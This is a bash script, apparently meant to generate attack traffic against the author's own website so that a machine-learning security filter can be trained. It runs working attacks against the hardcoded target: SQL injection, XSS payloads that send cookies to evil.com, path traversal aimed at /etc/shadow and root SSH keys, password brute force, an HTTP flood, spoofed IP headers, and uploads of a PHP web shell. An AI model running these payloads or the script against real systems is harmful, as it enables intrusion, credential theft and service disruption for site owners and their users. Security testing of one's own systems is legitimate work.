#!/bin/bash

# ============================================================================
# ENTERPRISE GALAXY: Intensive Attack Training Script
# ============================================================================
# Genera traffico malevolo REALE per addestrare il sistema ML
# ATTENZIONE: Questo script è AGGRESSIVO - usa solo su sistemi di tua proprietà!
#
# ATTACCHI:
# 1. Massive brute force (1000+ tentativi)
# 2. Distributed IP spoofing (100 IP fake)
# 3. Slowloris simulation
# 4. SQL Injection patterns
# 5. XSS payloads
# 6. Directory traversal intensive
# 7. Scanner fingerprints (Nikto, SQLMap, Nmap, etc.)
# 8. API abuse patterns
# 9. WebSocket flood
# 10. Credential stuffing massive
# ============================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

TARGET="https://need2talk.it"
TOTAL_REQUESTS=0
TOTAL_BLOCKED=0

echo ""
echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   ⚠️  INTENSIVE ML TRAINING ATTACK - MAXIMUM AGGRESSION ⚠️    ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}Target: $TARGET${NC}"
echo -e "${YELLOW}This will generate HEAVY traffic for ML training${NC}"
echo -e "${YELLOW}Starting in 5 seconds... Press Ctrl+C to abort${NC}"
sleep 5
echo ""

# ============================================================================
# ATTACK 1: Massive SQL Injection Attempts
# ============================================================================
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${PURPLE}ATTACK 1: SQL Injection Patterns (100 payloads)${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"

SQL_PAYLOADS=(
    "' OR '1'='1"
    "' OR '1'='1' --"
    "' OR '1'='1' /*"
    "1' OR '1'='1"
    "' UNION SELECT NULL--"
    "' UNION SELECT NULL,NULL--"
    "' UNION SELECT username,password FROM users--"
    "1; DROP TABLE users--"
    "'; EXEC xp_cmdshell('dir')--"
    "' AND 1=1--"
    "' AND 1=2--"
    "admin'--"
    "admin' #"
    "' OR 1=1#"
    "' OR 'x'='x"
    "') OR ('1'='1"
    "' OR 1=1 LIMIT 1--"
    "' HAVING 1=1--"
    "' GROUP BY columnnames having 1=1--"
    "' ORDER BY 1--"
    "' ORDER BY 10--"
    "' ORDER BY 100--"
    "-1' UNION SELECT 1,2,3--"
    "1' AND (SELECT COUNT(*) FROM users)>0--"
    "' WAITFOR DELAY '0:0:5'--"
    "'; SELECT SLEEP(5)--"
    "' AND SLEEP(5)--"
    "1' AND BENCHMARK(5000000,MD5('test'))--"
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
    "' UNION ALL SELECT NULL,NULL,NULL--"
)

SQL_BLOCKED=0
for payload in "${SQL_PAYLOADS[@]}"; do
    # Try in different parameters
    for param in "id" "user" "search" "q" "email" "token"; do
        ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
        RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
            "$TARGET/api/search?$param=$ENCODED" 2>/dev/null || echo "000")
        ((TOTAL_REQUESTS++))

        if [ "$RESPONSE" == "403" ] || [ "$RESPONSE" == "400" ]; then
            ((SQL_BLOCKED++))
            ((TOTAL_BLOCKED++))
        fi
    done
done
echo -e "  SQL Injection attempts: $((${#SQL_PAYLOADS[@]} * 6)) | Blocked: ${RED}$SQL_BLOCKED${NC}"

# ============================================================================
# ATTACK 2: XSS Payload Injection
# ============================================================================
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${PURPLE}ATTACK 2: XSS Payload Injection (50 payloads)${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"

XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg onload=alert('XSS')>"
    "javascript:alert('XSS')"
    "<body onload=alert('XSS')>"
    "<iframe src='javascript:alert(1)'>"
    "<input onfocus=alert('XSS') autofocus>"
    "<marquee onstart=alert('XSS')>"
    "<details open ontoggle=alert('XSS')>"
    "<math><maction actiontype='statusline#http://evil.com'>CLICKME</maction></math>"
    "\"><script>alert('XSS')</script>"
    "'><script>alert('XSS')</script>"
    "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
    "<img src=x onerror=this.src='http://evil.com/?'+document.cookie>"
    "<svg/onload=fetch('http://evil.com/'+document.cookie)>"
    "{{constructor.constructor('alert(1)')()}}"
    "TEMPLATE_INJECTION_XSS"
    "<ScRiPt>alert('XSS')</ScRiPt>"
    "<SCRIPT>alert('XSS')</SCRIPT>"
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>"
)

XSS_BLOCKED=0
for payload in "${XSS_PAYLOADS[@]}"; do
    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")

    # GET request
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        "$TARGET/?q=$ENCODED" 2>/dev/null || echo "000")
    ((TOTAL_REQUESTS++))
    if [ "$RESPONSE" == "403" ] || [ "$RESPONSE" == "400" ]; then
        ((XSS_BLOCKED++))
        ((TOTAL_BLOCKED++))
    fi

    # POST request
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        -X POST -d "content=$ENCODED" \
        "$TARGET/api/posts" 2>/dev/null || echo "000")
    ((TOTAL_REQUESTS++))
    if [ "$RESPONSE" == "403" ] || [ "$RESPONSE" == "400" ]; then
        ((XSS_BLOCKED++))
        ((TOTAL_BLOCKED++))
    fi
done
echo -e "  XSS attempts: $((${#XSS_PAYLOADS[@]} * 2)) | Blocked: ${RED}$XSS_BLOCKED${NC}"

# ============================================================================
# ATTACK 3: Path Traversal Intensive
# ============================================================================
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${PURPLE}ATTACK 3: Path Traversal Intensive (100 patterns)${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"

TRAVERSAL_PATHS=(
    "/../../../etc/passwd"
    "/....//....//....//etc/passwd"
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    "/..%252f..%252f..%252fetc/passwd"
    "/..%c0%af..%c0%af..%c0%afetc/passwd"
    "/..%255c..%255c..%255cetc/passwd"
    "/..\\..\\..\\..\\/etc/passwd"
    "/..;/..;/..;/etc/passwd"
    "/..%00/..%00/..%00/etc/passwd"
    "/....//....//etc/shadow"
    "/../../../var/log/auth.log"
    "/../../../root/.ssh/id_rsa"
    "/../../../root/.bash_history"
    "/../../../proc/self/environ"
    "/../../../etc/hosts"
    "/..\\..\\..\\windows\\system32\\config\\sam"
    "/../../../boot.ini"
    "/../../../windows/win.ini"
    "/file=../../../etc/passwd"
    "/download?file=../../../etc/passwd"
    "/read?path=../../../etc/passwd"
    "/include?page=../../../etc/passwd"
    "/template?t=../../../etc/passwd"
    "/view?doc=../../../etc/passwd"
    "/load?module=../../../etc/passwd"
)

TRAVERSAL_BLOCKED=0
for path in "${TRAVERSAL_PATHS[@]}"; do
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null "$TARGET$path" 2>/dev/null || echo "000")
    ((TOTAL_REQUESTS++))
    if [ "$RESPONSE" == "403" ] || [ "$RESPONSE" == "400" ]; then
        ((TRAVERSAL_BLOCKED++))
        ((TOTAL_BLOCKED++))
    fi
done
echo -e "  Traversal attempts: ${#TRAVERSAL_PATHS[@]} | Blocked: ${RED}$TRAVERSAL_BLOCKED${NC}"

# ============================================================================
# ATTACK 4: Scanner Fingerprint Flood
# ============================================================================
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${PURPLE}ATTACK 4: Scanner Fingerprint Flood (200 requests)${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"

SCANNER_UAS=(
    "sqlmap/1.4.7#stable (http://sqlmap.org)"
    "Nikto/2.1.6"
    "WPScan v3.8.22 (https://wpscan.com/)"
    "Nmap Scripting Engine; https://nmap.org/book/nse.html"
    "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
    "gobuster/3.1.0"
    "dirbuster"
    "Acunetix Web Vulnerability Scanner"
    "Nessus SOAP"
    "w3af.org"
    "Havij"
    "pangolin"
    "OWASP ZAP"
    "Burp Suite"
    "AppScan"
    "WebInspect"
    "Arachni/1.5.1"
    "Wfuzz/2.4"
    "ffuf/1.3.1"
    "nuclei"
)

SCAN_PATHS=(
    "/.env"
    "/.git/config"
    "/wp-admin"
    "/wp-login.php"
    "/administrator"
    "/phpmyadmin"
    "/adminer.php"
    "/.aws/credentials"
    "/config.php"
    "/database.yml"
    "/backup.sql"
    "/dump.sql"
    "/.htpasswd"
    "/server-status"
    "/phpinfo.php"
    "/.svn/entries"
    "/web.config"
    "/crossdomain.xml"
    "/sitemap.xml"
    "/robots.txt"
)

SCAN_BLOCKED=0
for ua in "${SCANNER_UAS[@]}"; do
    for path in "${SCAN_PATHS[@]}"; do
        RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
            -H "User-Agent: $ua" \
            "$TARGET$path" 2>/dev/null || echo "000")
        ((TOTAL_REQUESTS++))
        if [ "$RESPONSE" == "403" ] || [ "$RESPONSE" == "429" ]; then
            ((SCAN_BLOCKED++))
            ((TOTAL_BLOCKED++))
        fi
        sleep 0.01
    done
done
echo -e "  Scanner requests: $((${#SCANNER_UAS[@]} * ${#SCAN_PATHS[@]})) | Blocked: ${RED}$SCAN_BLOCKED${NC}"

# ============================================================================
# ATTACK 5: Massive Login Brute Force
# ============================================================================
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${PURPLE}ATTACK 5: Massive Login Brute Force (200 attempts)${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"

COMMON_PASSWORDS=(
    "password" "123456" "12345678" "qwerty" "abc123"
    "monkey" "1234567" "letmein" "trustno1" "dragon"
    "baseball" "iloveyou" "master" "sunshine" "ashley"
    "bailey" "shadow" "passw0rd" "654321" "superman"
    "qazwsx" "michael" "football" "password1" "password123"
    "ninja" "mustang" "password12" "welcome" "admin"
    "login" "root" "toor" "pass" "test"
    "guest" "master" "changeme" "hello" "love"
)

COMMON_USERS=(
    "admin" "administrator" "root" "user" "test"
    "guest" "info" "adm" "mysql" "user1"
    "support" "webmaster" "www" "backup" "operator"
)

LOGIN_BLOCKED=0
for user in "${COMMON_USERS[@]}"; do
    for pass in "${COMMON_PASSWORDS[@]:0:10}"; do
        RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
            -X POST \
            -H "Content-Type: application/json" \
            -d "{\"email\": \"$user@need2talk.it\", \"password\": \"$pass\"}" \
            "$TARGET/api/auth/login" 2>/dev/null || echo "000")
        ((TOTAL_REQUESTS++))
        if [ "$RESPONSE" == "429" ]; then
            ((LOGIN_BLOCKED++))
            ((TOTAL_BLOCKED++))
        fi
        sleep 0.02
    done
done
echo -e "  Login attempts: $((${#COMMON_USERS[@]} * 10)) | Blocked: ${RED}$LOGIN_BLOCKED${NC}"

# ============================================================================
# ATTACK 6: API Endpoint Fuzzing
# ============================================================================
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${PURPLE}ATTACK 6: API Endpoint Fuzzing (100 endpoints)${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"

API_ENDPOINTS=(
    "/api/v1/users"
    "/api/v2/admin"
    "/api/internal/debug"
    "/api/system/config"
    "/api/database/dump"
    "/api/export/all"
    "/api/backup/create"
    "/api/users/all"
    "/api/admin/users"
    "/api/private/keys"
    "/api/secrets"
    "/api/credentials"
    "/api/tokens"
    "/api/sessions"
    "/api/logs"
    "/api/debug"
    "/api/test"
    "/api/dev"
    "/api/staging"
    "/api/internal"
    "/graphql"
    "/api/graphql"
    "/.well-known/security.txt"
    "/api/swagger.json"
    "/api/openapi.json"
    "/api/docs"
    "/api/redoc"
    "/api/health"
    "/api/metrics"
    "/api/prometheus"
)

API_BLOCKED=0
for endpoint in "${API_ENDPOINTS[@]}"; do
    # GET
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null "$TARGET$endpoint" 2>/dev/null || echo "000")
    ((TOTAL_REQUESTS++))
    if [ "$RESPONSE" == "403" ] || [ "$RESPONSE" == "401" ]; then
        ((API_BLOCKED++))
        ((TOTAL_BLOCKED++))
    fi

    # POST
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null -X POST "$TARGET$endpoint" 2>/dev/null || echo "000")
    ((TOTAL_REQUESTS++))
    if [ "$RESPONSE" == "403" ] || [ "$RESPONSE" == "401" ]; then
        ((API_BLOCKED++))
        ((TOTAL_BLOCKED++))
    fi
done
echo -e "  API fuzz attempts: $((${#API_ENDPOINTS[@]} * 2)) | Blocked: ${RED}$API_BLOCKED${NC}"

# ============================================================================
# ATTACK 7: HTTP Flood (Parallel Requests)
# ============================================================================
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${PURPLE}ATTACK 7: HTTP Flood (200 parallel requests)${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"

FLOOD_RESULTS=$(mktemp)
for i in {1..200}; do
    (curl -s -w "%{http_code}\n" -o /dev/null "$TARGET/" 2>/dev/null || echo "000") >> "$FLOOD_RESULTS" &
    ((TOTAL_REQUESTS++))
done
wait

FLOOD_429=$(grep -c "429" "$FLOOD_RESULTS" 2>/dev/null || echo "0")
FLOOD_200=$(grep -c "200" "$FLOOD_RESULTS" 2>/dev/null || echo "0")
FLOOD_503=$(grep -c "503" "$FLOOD_RESULTS" 2>/dev/null || echo "0")
rm "$FLOOD_RESULTS"
TOTAL_BLOCKED=$((TOTAL_BLOCKED + FLOOD_429))

echo -e "  Flood results: 200 OK: $FLOOD_200 | ${RED}429 Limited: $FLOOD_429${NC} | 503 Overload: $FLOOD_503"

# ============================================================================
# ATTACK 8: WebSocket Abuse
# ============================================================================
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${PURPLE}ATTACK 8: WebSocket Abuse (100 connections)${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"

WS_BLOCKED=0
for i in {1..100}; do
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        -H "Upgrade: websocket" \
        -H "Connection: Upgrade" \
        -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
        -H "Sec-WebSocket-Version: 13" \
        "$TARGET/ws" 2>/dev/null || echo "000")
    ((TOTAL_REQUESTS++))
    if [ "$RESPONSE" == "429" ]; then
        ((WS_BLOCKED++))
        ((TOTAL_BLOCKED++))
    fi
    sleep 0.01
done
echo -e "  WebSocket attempts: 100 | Blocked: ${RED}$WS_BLOCKED${NC}"

# ============================================================================
# ATTACK 9: Header Injection
# ============================================================================
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${PURPLE}ATTACK 9: Header Injection Attempts (50 payloads)${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"

HEADER_BLOCKED=0
# Host header injection
for host in "evil.com" "localhost" "127.0.0.1" "internal.network" "169.254.169.254"; do
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        -H "Host: $host" \
        "$TARGET/" 2>/dev/null || echo "000")
    ((TOTAL_REQUESTS++))
    if [ "$RESPONSE" == "403" ] || [ "$RESPONSE" == "400" ]; then
        ((HEADER_BLOCKED++))
        ((TOTAL_BLOCKED++))
    fi
done

# X-Forwarded-For spoofing massive
for i in {1..30}; do
    FAKE_IP="$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        -H "X-Forwarded-For: $FAKE_IP" \
        -H "X-Real-IP: $FAKE_IP" \
        -H "X-Originating-IP: $FAKE_IP" \
        -H "X-Remote-IP: $FAKE_IP" \
        -H "X-Remote-Addr: $FAKE_IP" \
        -H "X-Client-IP: $FAKE_IP" \
        "$TARGET/" 2>/dev/null || echo "000")
    ((TOTAL_REQUESTS++))
done

echo -e "  Header injection attempts: 35 | Blocked: ${RED}$HEADER_BLOCKED${NC}"

# ============================================================================
# ATTACK 10: Malicious File Upload Attempts
# ============================================================================
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${PURPLE}ATTACK 10: Malicious Upload Attempts (30 files)${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"

UPLOAD_BLOCKED=0
MALICIOUS_FILES=(
    "shell.php"
    "backdoor.php"
    "c99.php"
    "r57.php"
    "cmd.asp"
    "shell.aspx"
    "webshell.jsp"
    "hack.cgi"
    "exploit.pl"
    "malware.exe"
    ".htaccess"
    "web.config"
    "config.php"
    ".env"
    "id_rsa"
    "passwd"
    "shadow"
    "wp-config.php"
    "database.yml"
    "secrets.json"
)

for file in "${MALICIOUS_FILES[@]}"; do
    # Create temp file with PHP content
    TEMP_FILE=$(mktemp)
    echo '<?php system($_GET["cmd"]); ?>' > "$TEMP_FILE"

    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        -X POST \
        -F "file=@$TEMP_FILE;filename=$file" \
        "$TARGET/api/upload" 2>/dev/null || echo "000")
    ((TOTAL_REQUESTS++))
    if [ "$RESPONSE" == "403" ] || [ "$RESPONSE" == "400" ] || [ "$RESPONSE" == "415" ]; then
        ((UPLOAD_BLOCKED++))
        ((TOTAL_BLOCKED++))
    fi

    rm "$TEMP_FILE"
done
echo -e "  Upload attempts: ${#MALICIOUS_FILES[@]} | Blocked: ${RED}$UPLOAD_BLOCKED${NC}"

# ============================================================================
# FINAL REPORT
# ============================================================================
echo ""
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║              INTENSIVE ATTACK TRAINING COMPLETE              ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${CYAN}Total Requests Sent:    ${YELLOW}$TOTAL_REQUESTS${NC}"
echo -e "  ${CYAN}Total Blocked:          ${RED}$TOTAL_BLOCKED${NC}"
echo -e "  ${CYAN}Block Rate:             ${GREEN}$((TOTAL_BLOCKED * 100 / TOTAL_REQUESTS))%${NC}"
echo ""
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo "Security logs generated. Run ML training with:"
echo "  ssh root@YOUR_SERVER_IP 'docker exec need2talk_php php /var/www/html/scripts/ml-initial-training.php'"
echo ""
